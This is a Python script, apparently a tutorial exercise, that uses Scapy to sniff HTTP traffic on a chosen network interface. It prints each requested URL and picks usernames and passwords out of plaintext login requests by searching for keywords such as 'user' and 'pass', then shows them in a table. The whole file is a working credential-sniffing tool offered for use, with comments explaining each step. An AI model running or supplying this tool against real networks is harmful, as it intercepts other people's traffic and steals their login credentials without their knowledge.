import scapy.all as scapy
from scapy.layers import http
import optparse


def sniff(interface):
    # Start sniffing on the specified network interface
    scapy.sniff(
        iface=interface,    # → The network interface to sniff packets on (Ex: "eth0")
        store=False,        # → Do not store packets in memory (slower)
        prn=process_packet  # → Callback function to process and analyze each captured packet
    )

def Get_Arguments():
    # Create an OptionParser object for command line options
    parser = optparse.OptionParser()
    
    # Add option for Network Interface
    parser.add_option("-i", "--interface", dest="Network_Interface", help="")
    
    # Get the options and arguments from command line
    (options, arguments) = parser.parse_args()
    
    # Check if Network Interface was provided
    if not options.Network_Interface:
        print("[-] Error: Please specify Network Interface, use --help for more info.")
        exit()
        
    # Return the options object
    return options

def get_url(packet):
    """
    Extracts the full URL from an HTTP request packet.

    Parameters:
        packet (scapy.packet.Packet): The HTTP request packet to extract the URL from.

    Returns:
        str: The full URL (Ex: "example.com/path/to/resource").
    """
    
    # Get the HTTP request packet layer
    request = packet[http.HTTPRequest]
    
    # Get the Host header (the domain name or IP address)
    host = request.Host
    
    # Get the Path header (the resource path, including any query string)
    path = request.Path
    
    # Combine the Host and Path headers to form the full URL
    url = host + path
    
    # Return the full URL
    return url

    # Extract the full URL from an HTTP request packet at once
    # return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    """
    Extracts login information (username and password) from an HTTP request packet if present.

    Parameters:
        packet (scapy.packet.Packet): The HTTP request packet to extract login information from.

    Returns:
        str: The login information if found (Ex: "username=foo&password=bar"), otherwise None.
    """
    # Check if the packet has a Raw layer → This is where the login information is stored
    if packet.haslayer(scapy.Raw):
        # Store all information that is in the Raw layer
        load = packet[scapy.Raw].load

        # List of keywords to search for in the Raw layer Data
        keywords = ["username", "user", "login", "password", "pass"]
        
        for keyword in keywords:
            if keyword in str(load):
                # If a keyword is found, return the Data (which contains the login information)
                return load


def process_packet(packet):
    """
    Process a single packet captured by the sniffer.

    If the packet is an HTTP request, it extracts the URL, and if it contains
    login information (username and password), it extracts and prints that as
    well.

    Parameters:
        packet (scapy.packet.Packet): The packet to process.

    Returns:
        None
    """
    # Check if the packet is an HTTP request
    if packet.haslayer(http.HTTPRequest):
        # Get the URL from the packet
        url = get_url(packet).decode(errors="ignore")
        print("[+] HTTP Request >> " + str(url))

        # Get the login information from the packet
        loginInfo = get_login_info(packet)

        if loginInfo:
            # Decode the login information and ignore any errors (un understandable characters)
            login_data = loginInfo.decode(errors="ignore")

            # Initialize variables to store the username and password (N/A = Not Available)
            username, password = "N/A", "N/A"

            # Split the login information into parameters at each "&"
            # Ex: "username=foo&password=bar" → ["username=foo", "password=bar"]
            parameters = login_data.split("&")

            # Iterate over the parameters and extract the username and password
            for param in parameters:
                if "username" in param or "user" in param:
                    # Split the parameter at the "=" to get the username
                    # [1] → Get the second part which is after the "="
                    username = param.split("=")[1] if "=" in param else "N/A"
                if "password" in param or "pass" in param:
                    # Split the parameter at the "=" to get the password
                    # [1] → Get the second part which is after the "="
                    password = param.split("=")[1] if "=" in param else "N/A"

            # Calculate the length of the separator
            separator_length = max(len(username), len(password), len(url)) + 15

            # Print the login information
            print("\n+" + "-" * separator_length + "+")
            print(f"| Website   | {url}{' ' * (separator_length - len(url) - 13)}|")
            print("+" + "-" * separator_length + "+")
            print(f"| Username  | {username}{' ' * (separator_length - len(username) - 13)}|")
            print(f"| Password  | {password}{' ' * (separator_length - len(password) - 13)}|")
            print("+" + "-" * separator_length + "+\n")


options = Get_Arguments()
sniff(options.Network_Interface)
